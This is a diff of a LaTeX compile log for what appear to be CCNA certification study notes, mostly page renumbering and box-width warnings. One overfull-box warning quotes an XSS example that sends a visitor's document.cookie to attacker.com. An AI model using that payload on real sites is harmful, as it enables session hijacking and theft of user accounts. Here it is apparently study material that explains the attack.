@@ -1,4 +1,4 @@
-This is pdfTeX, Version 3.141592653-2.6-1.40.26 (TeX Live 2024) (preloaded format=pdflatex 2024.6.3)  29 JUN 2024 07:24
+This is pdfTeX, Version 3.141592653-2.6-1.40.26 (TeX Live 2024) (preloaded format=pdflatex 2024.6.3)  30 JUN 2024 01:51
 entering extended mode
  restricted \write18 enabled.
  %&-line parsing enabled.
@@ -211,73 +211,53 @@ al/texlive/2024/texmf-dist/fonts/enc/dvips/base/8r.enc}]
 [4]
 
 [5]
+Underfull \hbox (badness 10000) in paragraph at lines 60--66
+
+ []
+
+
 
 [6]
-Underfull \hbox (badness 10000) in paragraph at lines 68--74
+Underfull \hbox (badness 10000) in paragraph at lines 74--75
 
  []
 
 
-Underfull \hbox (badness 10000) in paragraph at lines 82--83
-
- []
-
-
-Underfull \hbox (badness 10000) in paragraph at lines 83--87
+Underfull \hbox (badness 10000) in paragraph at lines 75--79
 
  []
 
 
 
 [7]
-Underfull \hbox (badness 10000) in paragraph at lines 92--97
+Underfull \hbox (badness 10000) in paragraph at lines 84--89
 
  []
 
 
-Underfull \hbox (badness 10000) in paragraph at lines 97--102
+Underfull \hbox (badness 10000) in paragraph at lines 89--94
 
  []
 
-LaTeX Font Info:    Trying to load font information for OML+ptm on input line 1
-06.
+LaTeX Font Info:    Trying to load font information for OML+ptm on input line 9
+8.
 (/usr/local/texlive/2024/texmf-dist/tex/latex/psnfss/omlptm.fd
 File: omlptm.fd 
 )
 LaTeX Font Info:    Font shape `OML/ptm/m/n' in size <10> not available
-(Font)              Font shape `OML/cmm/m/it' tried instead on input line 106.
+(Font)              Font shape `OML/cmm/m/it' tried instead on input line 98.
 
 
 [8]
-Underfull \hbox (badness 10000) in paragraph at lines 139--143
-
- []
-
-
-Underfull \hbox (badness 10000) in paragraph at lines 143--144
-
- []
-
-
 
 [9]
-Underfull \hbox (badness 10000) in paragraph at lines 144--145
-
- []
-
-
-Underfull \hbox (badness 10000) in paragraph at lines 145--146
-
- []
-
-
 
 [10]
 
 [11]
 
 [12]
-Underfull \hbox (badness 10000) in paragraph at lines 234--237
+Underfull \hbox (badness 10000) in paragraph at lines 244--247
 
  []
 
@@ -290,16 +270,26 @@ Underfull \hbox (badness 10000) in paragraph at lines 234--237
 [15]
 
 [16]
-Underfull \hbox (badness 10000) in paragraph at lines 263--264
+
+[17]
+Overfull \hbox (8.80135pt too wide) in paragraph at lines 269--270
+[]\OT1/ptm/b/n/10 2.8 De-scribe net-work de-vice man-age-ment ac-cess (Tel-net,
+ SSH, HTTP, HTTPS, con-sole, TACACS+/RADIUS,
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 277--278
 
  []
 
 
 
-[17]
-
 [18]
-Overfull \hbox (34.19144pt too wide) in paragraph at lines 302--306
+
+[19]
+
+[20]
+Overfull \hbox (34.19144pt too wide) in paragraph at lines 334--338
 \OT1/ptm/m/n/10 Router(config-router)# router-id X.X.X.X (OP-TIONAL) Router(con
 fig-router)# net-work \OML/cmm/m/it/10 <\OT1/ptm/m/n/10 IP[]address\OML/cmm/m/i
 t/10 ><\OT1/ptm/m/n/10 wildcard\OML/cmm/m/it/10 >\OT1/ptm/m/n/10 area
@@ -307,78 +297,78 @@ t/10 ><\OT1/ptm/m/n/10 wildcard\OML/cmm/m/it/10 >\OT1/ptm/m/n/10 area
 
 
 
-[19]
-Underfull \hbox (badness 10000) in paragraph at lines 329--332
-
- []
-
-
-Underfull \hbox (badness 10000) in paragraph at lines 333--336
-
- []
-
-
-Underfull \hbox (badness 10000) in paragraph at lines 337--339
-
- []
-
-
-Underfull \hbox (badness 10000) in paragraph at lines 340--341
-
- []
-
-
-Underfull \hbox (badness 10000) in paragraph at lines 342--343
-
- []
-
-
-
-[20]
-Underfull \hbox (badness 10000) in paragraph at lines 365--369
-
- []
-
-
-Underfull \hbox (badness 10000) in paragraph at lines 378--379
-
- []
-
-
-
 [21]
+Underfull \hbox (badness 10000) in paragraph at lines 361--364
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 365--368
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 369--371
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 372--373
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 374--375
+
+ []
+
+
 
 [22]
-Underfull \hbox (badness 10000) in paragraph at lines 415--418
+Underfull \hbox (badness 10000) in paragraph at lines 397--401
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 410--411
 
  []
 
 
 
 [23]
-Overfull \hbox (14.80948pt too wide) in paragraph at lines 431--432
+
+[24]
+Underfull \hbox (badness 10000) in paragraph at lines 447--450
+
+ []
+
+
+
+[25]
+Overfull \hbox (14.80948pt too wide) in paragraph at lines 463--464
 []\OT1/ptm/m/n/10 Classification is the pro-cess of iden-ti-fy-ing pack-ets or 
 traf-fic flows based on cer-tain cri-te-ria, such as source/destination
  []
 
 
 
-[24]
-
-[25]
-
 [26]
 
 [27]
-LaTeX Font Info:    Trying to load font information for OMS+ptm on input line 4
-77.
+
+[28]
+
+[29]
+LaTeX Font Info:    Trying to load font information for OMS+ptm on input line 5
+09.
  (/usr/local/texlive/2024/texmf-dist/tex/latex/psnfss/omsptm.fd
 File: omsptm.fd 
 )
 LaTeX Font Info:    Font shape `OMS/ptm/m/n' in size <10> not available
-(Font)              Font shape `OMS/cmsy/m/n' tried instead on input line 477.
+(Font)              Font shape `OMS/cmsy/m/n' tried instead on input line 509.
 
-Overfull \hbox (22.09116pt too wide) in paragraph at lines 473--493
+Overfull \hbox (22.09116pt too wide) in paragraph at lines 505--525
 \OT1/ptm/m/n/10 In com-puter sys-tems, mem-ory is or-ga-nized into bytes, each 
 rep-re-sented by two hex-adec-i-mal dig-its. \OMS/cmsy/m/n/10 n\OT1/ptm/m/n/10 
 xef\OMS/cmsy/m/n/10 n\OT1/ptm/m/n/10 xbe\OMS/cmsy/m/n/10 n\OT1/ptm/m/n/10 xad\O
@@ -386,7 +376,7 @@ MS/cmsy/m/n/10 n\OT1/ptm/m/n/10 xde
  []
 
 
-Overfull \hbox (62.7552pt too wide) in paragraph at lines 473--493
+Overfull \hbox (62.7552pt too wide) in paragraph at lines 505--525
 \OML/cmm/m/it/10 <\OT1/ptm/m/n/10 script\OML/cmm/m/it/10 >\OT1/ptm/m/n/10 var i
 mg = new Im-age(); img.src = 'http://attacker.com/steal.php?cookie=' + en-codeU
 RI-Com-po-nent(document.cookie);
@@ -394,100 +384,62 @@ RI-Com-po-nent(document.cookie);
 
 
 
-[28]
-
-[29]
-Underfull \hbox (badness 10000) in paragraph at lines 526--528
-
- []
-
-
-Underfull \hbox (badness 10000) in paragraph at lines 529--530
-
- []
-
-
-Underfull \hbox (badness 10000) in paragraph at lines 531--534
-
- []
-
-
-
 [30]
 
 [31]
+Underfull \hbox (badness 10000) in paragraph at lines 558--560
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 561--562
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 563--566
+
+ []
+
+
 
 [32]
 
 [33]
-Underfull \hbox (badness 10000) in paragraph at lines 625--626
+
+[34]
+
+[35]
+Underfull \hbox (badness 10000) in paragraph at lines 657--658
 
  []
 
 
-Overfull \hbox (1.85846pt too wide) in paragraph at lines 627--628
+Overfull \hbox (1.85846pt too wide) in paragraph at lines 659--660
 []\OT1/ptm/m/n/10 Protected Ex-ten-si-ble Au-then-ti-ca-tion Pro-to-col (PEAP) 
 en-cap-su-lates EAP within a TLS tun-nel (sim-i-lar to HTTPS).
  []
 
 
 
-[34]
-
-[35]
-
 [36]
 
 [37]
 
 [38]
-Underfull \hbox (badness 10000) in paragraph at lines 717--718
 
- []
+[39]
 
+[40]
 
-Underfull \hbox (badness 10000) in paragraph at lines 717--718
-
- []
-
-
-Underfull \hbox (badness 10000) in paragraph at lines 717--718
-
- []
-
-
-Underfull \hbox (badness 10000) in paragraph at lines 717--718
-
- []
-
-
-Underfull \hbox (badness 10000) in paragraph at lines 717--718
-
- []
-
-
-Underfull \hbox (badness 10000) in paragraph at lines 717--718
-
- []
-
-
-Underfull \hbox (badness 10000) in paragraph at lines 717--718
-
- []
-
-
-Underfull \hbox (badness 10000) in paragraph at lines 717--718
-
- []
-
-
-Underfull \hbox (badness 10000) in paragraph at lines 725--726
+[41]
+Underfull \hbox (badness 10000) in paragraph at lines 739--740
 
  []
 
 
 
-[39] (./200-301CCNA.aux)
+[42] (./200-301CCNA.aux)
  ***********
 LaTeX2e <2024-06-01>
 L3 programming layer <2024-05-08>
@@ -496,11 +448,11 @@ L3 programming layer <2024-05-08>
 Here is how much of TeX's memory you used:
  2227 strings out of 473600
  34987 string characters out of 5728709
- 1950890 words of memory out of 5000000
+ 1943890 words of memory out of 5000000
  25113 multiletter control sequences out of 15000+600000
  572445 words of font info for 64 fonts, out of 8000000 for 9000
  1141 hyphenation exceptions out of 8191
- 57i,6n,65p,8475b,234s stack positions out of 10000i,1000n,20000p,200000b,200000s
+ 57i,6n,65p,6766b,234s stack positions out of 10000i,1000n,20000p,200000b,200000s
 </usr/local/texlive/2024/texmf-dist/fonts/type1/public/amsfonts/cm/cmex10.pfb
 ></usr/local/texlive/2024/texmf-dist/fonts/type1/public/amsfonts/cm/cmmi10.pfb>
 </usr/local/texlive/2024/texmf-dist/fonts/type1/public/amsfonts/cm/cmmi7.pfb></
@@ -511,10 +463,10 @@ cal/texlive/2024/texmf-dist/fonts/type1/public/amsfonts/cm/cmsy7.pfb></usr/loca
 l/texlive/2024/texmf-dist/fonts/type1/urw/times/utmb8a.pfb></usr/local/texlive/
 2024/texmf-dist/fonts/type1/urw/times/utmr8a.pfb></usr/local/texlive/2024/texmf
 -dist/fonts/type1/urw/times/utmri8a.pfb>
-Output written on 200-301CCNA.pdf (39 pages, 241185 bytes).
+Output written on 200-301CCNA.pdf (42 pages, 246958 bytes).
 PDF statistics:
- 183 PDF objects out of 1000 (max. 8388607)
- 120 compressed objects within 2 object streams
+ 192 PDF objects out of 1000 (max. 8388607)
+ 126 compressed objects within 2 object streams
  0 named destinations out of 1000 (max. 500000)
  1 words of extra memory for PDF output out of 10000 (max. 10000000)
 
